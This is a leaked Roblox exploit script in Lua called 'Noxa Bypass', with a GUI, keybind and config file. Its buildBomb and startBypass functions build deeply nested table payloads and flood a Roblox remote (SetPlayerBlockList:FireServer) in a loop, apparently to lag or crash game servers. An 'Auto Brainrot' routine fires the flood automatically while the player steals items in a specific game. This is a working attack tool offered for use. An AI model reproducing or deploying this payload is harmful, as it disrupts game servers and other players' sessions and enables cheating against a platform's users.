--[[
	leaked by swixsy
	Noxa Bypass
	leaked by swixsy
]]

-- leaked by swixsy
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
-- leaked by swixsy

local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

-- ===== CONFIG =====
-- leaked by swixsy
local CONFIG_FILE = "NoxaBypass_Config.json"

local cfg = {
	power = 100000,
	keybind = "F",
	version = 1,
	minimized = false,
	locked = false,
	autoBrainrot = false
}

local function saveConfig()
	if writefile then
		pcall(function()
			writefile(CONFIG_FILE, HttpService:JSONEncode(cfg))
		end)
	end
end

local function loadConfig()
	if isfile and readfile and isfile(CONFIG_FILE) then
		local ok, data = pcall(function()
			return HttpService:JSONDecode(readfile(CONFIG_FILE))
		end)
		if ok and type(data) == "table" then
			cfg.power = tonumber(data.power) or 100000
			cfg.keybind = type(data.keybind) == "string" and data.keybind or "F"
			cfg.version = tonumber(data.version) or 1
			cfg.minimized = type(data.minimized) == "boolean" and data.minimized or false
			cfg.locked = type(data.locked) == "boolean" and data.locked or false
			cfg.autoBrainrot = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or false
		end
	end
end

loadConfig()
-- leaked by swixsy

-- ===== BYPASS =====
-- leaked by swixsy
local running = false
local spamThread = nil
local currentVersion = cfg.version
local powerValue = cfg.power
local active = false
local boundKey = Enum.KeyCode[cfg.keybind] or Enum.KeyCode.F
local waitingForKey = false
local wasStealing = false
-- leaked by swixsy

local V1_DEPTH, V1_DELAY = 200, 0.15
local V2_DEPTH, V2_DELAY = 296, 0.12

local function buildBomb(power, depth)
	local maintable = {}
	local spammedtable = {{}}
	local z = spammedtable[1]
	for i = 1, depth do
		local t = {}
		table.insert(z, t)
		z = t
	end
	for i = 1, math.floor(power / (depth + 2)) do
		table.insert(maintable, spammedtable)
	end
	return maintable
end

local function stopBypass()
	running = false
	if spamThread then pcall(function() task.cancel(spamThread) end) end
	spamThread = nil
end

local function startBypass(power)
	stopBypass()
	running = true
	local depth = (currentVersion == 1) and V1_DEPTH or V2_DEPTH
	local delay = (currentVersion == 1) and V1_DELAY or V2_DELAY
	local bomb = buildBomb(power, depth)
	spamThread = task.spawn(function()
		while running do
			pcall(function()
				game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
			end)
			task.wait(delay)
		end
	end)
end

-- ===== GUI =====
-- leaked by swixsy
pcall(function()
	local old = playerGui:FindFirstChild("NoxaBypass")
	if old then old:Destroy() end
end)

local gui = Instance.new("ScreenGui")
gui.Name = "NoxaBypass"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = playerGui

-- Main Container
-- leaked by swixsy
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 280, 0, 310)
main.Position = UDim2.new(0.5, -140, 0.5, -155)
main.BackgroundColor3 = Color3.fromRGB(3, 3, 4)
main.BackgroundTransparency = 0.1
main.BorderSizePixel = 0
main.ClipsDescendants = true
main.Active = true
main.Parent = gui
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 16)

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(25, 25, 30)
mainStroke.Thickness = 1
mainStroke.Parent = main

-- Header
local header = Instance.new("Frame")
header.Size = UDim2.new(1, -24, 0, 30)
header.Position = UDim2.new(0, 16, 0, 12)
header.BackgroundTransparency = 1
header.ZIndex = 5
header.Parent = main

local title = Instance.new("TextLabel")
title.Size = UDim2.new(0, 160, 1, 0)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "Noxa Bypass"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 15
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 6
title.Parent = header

-- Lock and Minimize buttons
local lockBtn = Instance.new("TextButton")
lockBtn.Size = UDim2.new(0, 24, 0, 24)
lockBtn.Position = UDim2.new(1, -54, 0.5, -12)
lockBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 22)
lockBtn.BackgroundTransparency = 0
lockBtn.BorderSizePixel = 0
lockBtn.Text = "🔓"
lockBtn.TextColor3 = Color3.fromRGB(255, 180, 50)
lockBtn.TextSize = 12
lockBtn.Font = Enum.Font.GothamBold
lockBtn.ZIndex = 7
lockBtn.Parent = header
Instance.new("UICorner", lockBtn).CornerRadius = UDim.new(1, 0)

local minimizeBtn = Instance.new("TextButton")
minimizeBtn.Size = UDim2.new(0, 24, 0, 24)
minimizeBtn.Position = UDim2.new(1, -26, 0.5, -12)
minimizeBtn.BackgroundTransparency = 1
minimizeBtn.BorderSizePixel = 0
minimizeBtn.Text = "—"
minimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
minimizeBtn.TextSize = 14
minimizeBtn.Font = Enum.Font.GothamBold
minimizeBtn.ZIndex = 7
minimizeBtn.Parent = header

-- Content (Rows)
-- leaked by swixsy
local content = Instance.new("Frame")
content.Size = UDim2.new(1, -24, 0, 160)
content.Position = UDim2.new(0, 12, 0, 50)
content.BackgroundTransparency = 1
content.ZIndex = 3
content.Parent = main

local function createRow(y, labelText)
	local row = Instance.new("Frame")
	row.Size = UDim2.new(1, 0, 0, 38)
	row.Position = UDim2.new(0, 0, 0, y)
	row.BackgroundColor3 = Color3.fromRGB(8, 8, 10)
	row.BackgroundTransparency = 0.1
	row.BorderSizePixel = 0
	row.ZIndex = 4
	row.Parent = content
	Instance.new("UICorner", row).CornerRadius = UDim.new(1, 0)

	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(0.5, 0, 1, 0)
	lbl.Position = UDim2.new(0, 16, 0, 0)
	lbl.BackgroundTransparency = 1
	lbl.Text = labelText
	lbl.TextColor3 = Color3.fromRGB(200, 200, 210)
	lbl.TextSize = 13
	lbl.Font = Enum.Font.GothamMedium
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.ZIndex = 5
	lbl.Parent = row
	return row
end

-- Keybind Row
local keyRow = createRow(0, "Keybind")
local keyBtn = Instance.new("TextButton")
keyBtn.Size = UDim2.new(0, 90, 0, 26)
keyBtn.Position = UDim2.new(1, -102, 0.5, -13)
keyBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
keyBtn.BackgroundTransparency = 0.1
keyBtn.BorderSizePixel = 0
keyBtn.Text = (cfg.keybind == "None" or cfg.keybind == "") and "None" or boundKey.Name
keyBtn.TextColor3 = Color3.fromRGB(230, 230, 245)
keyBtn.TextSize = 13
keyBtn.Font = Enum.Font.GothamBold
keyBtn.ZIndex = 5
keyBtn.Parent = keyRow
Instance.new("UICorner", keyBtn).CornerRadius = UDim.new(1, 0)
local keyStroke = Instance.new("UIStroke", keyBtn)
keyStroke.Color = Color3.fromRGB(30, 30, 35)

-- Power Row
local powerRow = createRow(46, "Power")
local powerBox = Instance.new("TextBox")
powerBox.Size = UDim2.new(0, 90, 0, 26)
powerBox.Position = UDim2.new(1, -102, 0.5, -13)
powerBox.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
powerBox.BackgroundTransparency = 0.1
powerBox.BorderSizePixel = 0
powerBox.Text = tostring(powerValue)
powerBox.TextColor3 = Color3.fromRGB(230, 230, 245)
powerBox.TextSize = 13
powerBox.Font = Enum.Font.GothamBold
powerBox.TextXAlignment = Enum.TextXAlignment.Center
powerBox.ClearTextOnFocus = false
powerBox.ZIndex = 5
powerBox.Parent = powerRow
Instance.new("UICorner", powerBox).CornerRadius = UDim.new(1, 0)
local pwrStroke = Instance.new("UIStroke", powerBox)
pwrStroke.Color = Color3.fromRGB(30, 30, 35)

-- Version Row
local versionRow = createRow(92, "Version")
local versionFrame = Instance.new("Frame")
versionFrame.Size = UDim2.new(0, 90, 0, 26)
versionFrame.Position = UDim2.new(1, -102, 0.5, -13)
versionFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
versionFrame.BackgroundTransparency = 0.1
versionFrame.BorderSizePixel = 0
versionFrame.ZIndex = 5
versionFrame.Parent = versionRow
Instance.new("UICorner", versionFrame).CornerRadius = UDim.new(1, 0)
local verStroke = Instance.new("UIStroke", versionFrame)
verStroke.Color = Color3.fromRGB(30, 30, 35)

local leftArrow = Instance.new("TextButton")
leftArrow.Size = UDim2.new(0, 26, 1, 0)
leftArrow.Position = UDim2.new(0, 0, 0, 0)
leftArrow.BackgroundTransparency = 1
leftArrow.Text = "<"
leftArrow.TextColor3 = Color3.fromRGB(200, 200, 210)
leftArrow.TextSize = 13
leftArrow.Font = Enum.Font.GothamBold
leftArrow.ZIndex = 6
leftArrow.Parent = versionFrame

local versionLbl = Instance.new("TextLabel")
versionLbl.Size = UDim2.new(0, 38, 1, 0)
versionLbl.Position = UDim2.new(0, 26, 0, 0)
versionLbl.BackgroundTransparency = 1
versionLbl.Text = "V" .. currentVersion
versionLbl.TextColor3 = Color3.fromRGB(230, 230, 245)
versionLbl.TextSize = 13
versionLbl.Font = Enum.Font.GothamBold
versionLbl.ZIndex = 6
versionLbl.Parent = versionFrame

local rightArrow = Instance.new("TextButton")
rightArrow.Size = UDim2.new(0, 26, 1, 0)
rightArrow.Position = UDim2.new(1, -26, 0, 0)
rightArrow.BackgroundTransparency = 1
rightArrow.Text = ">"
rightArrow.TextColor3 = Color3.fromRGB(200, 200, 210)
rightArrow.TextSize = 13
rightArrow.Font = Enum.Font.GothamBold
rightArrow.ZIndex = 6
rightArrow.Parent = versionFrame

-- Auto Brainrot Row
local autoRow = createRow(138, "Auto Brainrot")
local autoToggleBg = Instance.new("Frame")
autoToggleBg.Size = UDim2.new(0, 42, 0, 22)
autoToggleBg.Position = UDim2.new(1, -54, 0.5, -11)
autoToggleBg.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
autoToggleBg.BackgroundTransparency = 0.1
autoToggleBg.BorderSizePixel = 0
autoToggleBg.ZIndex = 5
autoToggleBg.Parent = autoRow
Instance.new("UICorner", autoToggleBg).CornerRadius = UDim.new(1, 0)

local autoToggleCircle = Instance.new("Frame")
autoToggleCircle.Size = UDim2.new(0, 18, 0, 18)
autoToggleCircle.Position = UDim2.new(0, 2, 0.5, -9)
autoToggleCircle.BackgroundColor3 = Color3.fromRGB(240, 240, 245)
autoToggleCircle.BorderSizePixel = 0
autoToggleCircle.ZIndex = 6
autoToggleCircle.Parent = autoToggleBg
Instance.new("UICorner", autoToggleCircle).CornerRadius = UDim.new(1, 0)

local autoToggleBtn = Instance.new("TextButton")
autoToggleBtn.Size = UDim2.new(1, 0, 1, 0)
autoToggleBtn.BackgroundTransparency = 1
autoToggleBtn.Text = ""
autoToggleBtn.ZIndex = 7
autoToggleBtn.Parent = autoToggleBg

-- Big Main Toggle (ENABLED / DISABLED)
-- leaked by swixsy
local mainToggle = Instance.new("TextButton")
mainToggle.Size = UDim2.new(1, -24, 0, 46)
mainToggle.Position = UDim2.new(0, 12, 1, -58)
mainToggle.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
mainToggle.BackgroundTransparency = 0.1
mainToggle.BorderSizePixel = 0
mainToggle.Text = "DISABLED"
mainToggle.TextColor3 = Color3.fromRGB(180, 180, 190)
mainToggle.TextSize = 14
mainToggle.Font = Enum.Font.GothamBold
mainToggle.ZIndex = 5
mainToggle.Parent = main
Instance.new("UICorner", mainToggle).CornerRadius = UDim.new(0, 12)
local bigToggleStroke = Instance.new("UIStroke", mainToggle)
bigToggleStroke.Color = Color3.fromRGB(35, 35, 40)
bigToggleStroke.Thickness = 1

-- ===== MINIMIZED UI =====
-- leaked by swixsy
local minimizedUI = Instance.new("Frame")
minimizedUI.Size = UDim2.new(0, 260, 0, 94)
minimizedUI.Position = UDim2.new(0.5, -130, 0.5, -47)
minimizedUI.BackgroundColor3 = Color3.fromRGB(3, 3, 4)
minimizedUI.BackgroundTransparency = 0.1
minimizedUI.BorderSizePixel = 0
minimizedUI.Visible = cfg.minimized
minimizedUI.Active = true
minimizedUI.Parent = gui
Instance.new("UICorner", minimizedUI).CornerRadius = UDim.new(0, 16)

local minStroke = Instance.new("UIStroke")
minStroke.Color = Color3.fromRGB(25, 25, 30)
minStroke.Thickness = 1
minStroke.Parent = minimizedUI

local minTitle = Instance.new("TextLabel")
minTitle.Size = UDim2.new(1, -16, 0, 20)
minTitle.Position = UDim2.new(0, 16, 0, 10)
minTitle.BackgroundTransparency = 1
minTitle.Text = "Noxa Bypass"
minTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
minTitle.TextSize = 14
minTitle.Font = Enum.Font.GothamBold
minTitle.TextXAlignment = Enum.TextXAlignment.Left
minTitle.ZIndex = 5
minTitle.Parent = minimizedUI

local minLockBtn = Instance.new("TextButton")
minLockBtn.Size = UDim2.new(0, 22, 0, 22)
minLockBtn.Position = UDim2.new(1, -56, 0, 9)
minLockBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
minLockBtn.BackgroundTransparency = 0
minLockBtn.BorderSizePixel = 0
minLockBtn.Text = "🔓"
minLockBtn.TextColor3 = Color3.fromRGB(255, 180, 50)
minLockBtn.TextSize = 12
minLockBtn.Font = Enum.Font.GothamBold
minLockBtn.ZIndex = 5
minLockBtn.Parent = minimizedUI
Instance.new("UICorner", minLockBtn).CornerRadius = UDim.new(1, 0)

local maxBtn = Instance.new("TextButton")
maxBtn.Size = UDim2.new(0, 22, 0, 22)
maxBtn.Position = UDim2.new(1, -30, 0, 9)
maxBtn.BackgroundTransparency = 1
maxBtn.BorderSizePixel = 0
maxBtn.Text = "+"
maxBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
maxBtn.TextSize = 14
maxBtn.Font = Enum.Font.GothamBold
maxBtn.ZIndex = 5
maxBtn.Parent = minimizedUI

local bigToggle = Instance.new("TextButton")
bigToggle.Size = UDim2.new(1, -24, 0, 42)
bigToggle.Position = UDim2.new(0, 12, 0, 42)
bigToggle.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
bigToggle.BackgroundTransparency = 0.1
bigToggle.BorderSizePixel = 0
bigToggle.Text = "DISABLED"
bigToggle.TextColor3 = Color3.fromRGB(180, 180, 190)
bigToggle.TextSize = 13
bigToggle.Font = Enum.Font.GothamBold
bigToggle.ZIndex = 5
bigToggle.Parent = minimizedUI
Instance.new("UICorner", bigToggle).CornerRadius = UDim.new(0, 12)

local bigToggleStroke = Instance.new("UIStroke")
bigToggleStroke.Color = Color3.fromRGB(35, 35, 40)
bigToggleStroke.Thickness = 1
bigToggleStroke.Parent = bigToggle

-- ===== LOGIC =====
-- leaked by swixsy
local function updateVisual()
	if active then
		mainToggle.Text = "ENABLED"
		mainToggle.TextColor3 = Color3.fromRGB(220, 220, 230)
		TweenService:Create(mainToggle, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(25, 25, 30)}):Play()
		TweenService:Create(bigToggleStroke, TweenInfo.new(0.15), {Color = Color3.fromRGB(60, 60, 70)}):Play()
		
		bigToggle.Text = "ENABLED"
		bigToggle.TextColor3 = Color3.fromRGB(220, 220, 230)
		TweenService:Create(bigToggle, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(25, 25, 30)}):Play()
	else
		mainToggle.Text = "DISABLED"
		mainToggle.TextColor3 = Color3.fromRGB(180, 180, 190)
		TweenService:Create(mainToggle, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(15, 15, 18)}):Play()
		TweenService:Create(bigToggleStroke, TweenInfo.new(0.15), {Color = Color3.fromRGB(35, 35, 40)}):Play()
		
		bigToggle.Text = "DISABLED"
		bigToggle.TextColor3 = Color3.fromRGB(180, 180, 190)
		TweenService:Create(bigToggle, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(15, 15, 18)}):Play()
	end
	
	if cfg.autoBrainrot then
		TweenService:Create(autoToggleCircle, TweenInfo.new(0.15), {Position = UDim2.new(1, -20, 0.5, -9)}):Play()
		TweenService:Create(autoToggleBg, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(45, 45, 55)}):Play()
	else
		TweenService:Create(autoToggleCircle, TweenInfo.new(0.15), {Position = UDim2.new(0, 2, 0.5, -9)}):Play()
		TweenService:Create(autoToggleBg, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(25, 25, 30)}):Play()
	end
end

local function setActive(state)
	active = state
	if state then startBypass(powerValue) else stopBypass() end
	updateVisual()
end

local function setVersion(v)
	if v < 1 then v = 1 end
	if v > 2 then v = 2 end
	currentVersion = v
	cfg.version = v
	versionLbl.Text = "V" .. v
	saveConfig()
	if active then startBypass(powerValue) end
end

local function toggleLock()
	cfg.locked = not cfg.locked
	local lockText = cfg.locked and "🔒" or "🔓"
	lockBtn.Text = lockText
	minLockBtn.Text = lockText
	saveConfig()
end

lockBtn.MouseButton1Click:Connect(toggleLock)
minLockBtn.MouseButton1Click:Connect(toggleLock)

-- Minimize / Maximize
local function setMinimized(state)
	cfg.minimized = state
	saveConfig()
	
	if state then
		main.Visible = false
		minimizedUI.Visible = true
		minimizedUI.Position = main.Position
	else
		main.Visible = true
		minimizedUI.Visible = false
		main.Position = minimizedUI.Position
	end
end

minimizeBtn.MouseButton1Click:Connect(function() setMinimized(true) end)
maxBtn.MouseButton1Click:Connect(function() setMinimized(false) end)

-- Toggles & Version Switch
mainToggle.MouseButton1Click:Connect(function() setActive(not active) end)
bigToggle.MouseButton1Click:Connect(function() setActive(not active) end)
leftArrow.MouseButton1Click:Connect(function() setVersion(currentVersion - 1) end)
rightArrow.MouseButton1Click:Connect(function() setVersion(currentVersion + 1) end)

autoToggleBtn.MouseButton1Click:Connect(function()
	cfg.autoBrainrot = not cfg.autoBrainrot
	saveConfig()
	updateVisual()
end)

powerBox.FocusLost:Connect(function()
	local n = tonumber(powerBox.Text)
	if n then
		powerValue = math.clamp(math.floor(n), 1, 999999)
		powerBox.Text = tostring(powerValue)
		cfg.power = powerValue
		saveConfig()
		if active then startBypass(powerValue) end
	else
		powerBox.Text = tostring(powerValue)
	end
end)

keyBtn.MouseButton1Click:Connect(function()
	if waitingForKey then return end
	waitingForKey = true
	keyBtn.Text = "..."
end)

UserInputService.InputBegan:Connect(function(inp, gpe)
	local kc = inp.KeyCode
	if kc == Enum.KeyCode.Unknown then return end

	if waitingForKey then
		if kc == Enum.KeyCode.Escape then
			waitingForKey = false
			keyBtn.Text = cfg.keybind == "None" and "None" or (boundKey and boundKey.Name or "None")
			return
		end
		boundKey = kc
		cfg.keybind = kc.Name
		keyBtn.Text = kc.Name
		waitingForKey = false
		saveConfig()
		return
	end

	if gpe then return end

	if boundKey and kc == boundKey then
		setActive(not active)
	end
end)

-- Drag Logic
local dragging, dragStart, startPos
local function setupDrag(element)
	element.InputBegan:Connect(function(inp)
		if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
			if cfg.locked then return end
			dragging = true
			dragStart = inp.Position
			startPos = element.Position
		end
	end)
end

setupDrag(main)
setupDrag(minimizedUI)

UserInputService.InputEnded:Connect(function(inp)
	if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
		dragging = false
	end
end)

UserInputService.InputChanged:Connect(function(inp)
	if dragging and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
		local d = inp.Position - dragStart
		local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
		main.Position = newPos
		minimizedUI.Position = newPos
	end
end)

-- ===== AUTO BRAINROT LOGIC (Steal a Brainrot) =====
-- leaked by swixsy
-- Dans ce jeu, quand tu voles un brainrot, l'objet est dans le Workspace et te suit.
-- On vérifie donc si un objet "brainrot" est proche de toi ET ne t'appartient pas.

task.spawn(function()
	while true do
		task.wait(0.3)
		if cfg.autoBrainrot then
			local char = LocalPlayer.Character
			if not char or not char:FindFirstChild("HumanoidRootPart") then
				wasStealing = false
				continue
			end
			
			local rootPart = char.HumanoidRootPart
			local isStealingNow = false
			
			-- On parcourt le Workspace pour trouver un brainrot qui te suit
			for _, obj in pairs(workspace:GetChildren()) do
				-- Détection : le nom contient "brainrot" ou c'est un Model avec un Owner
				local objName = obj.Name:lower()
				if objName:find("brainrot") or obj:FindFirstChild("Owner") or obj:FindFirstChild("BrainrotData") then
					-- On vérifie que ce n'est PAS à toi (Owner ~= LocalPlayer ou pas d'Owner)
					local owner = obj:FindFirstChild("Owner")
					local isMine = false
					if owner and owner.Value == LocalPlayer then
						isMine = true
					end
					
					-- Si c'est un objet qui te suit (proche de toi) et que ce n'est pas à toi, tu es en train de voler
					if not isMine then
						local objPart = obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChild("PrimaryPart") or obj:FindFirstChildWhichIsA("BasePart")
						if objPart and (objPart.Position - rootPart.Position).Magnitude < 15 then
							isStealingNow = true
							break
						end
					end
				end
			end
			
			-- Si on est en train de voler et que le bypass n'est pas actif -> On l'active
			if isStealingNow and not active then
				setActive(true)
			end
			
			wasStealing = isStealingNow
		end
	end
end)

-- Init
if cfg.minimized then
	main.Visible = false
	minimizedUI.Visible = true
else
	main.Visible = true
	minimizedUI.Visible = false
end

local initLockText = cfg.locked and "🔒" or "🔓"
lockBtn.Text = initLockText
minLockBtn.Text = initLockText

updateVisual()
-- leaked by swixsy
print("[NOXA BYPASS] Ready - Auto Brainrot (Steal Detection)")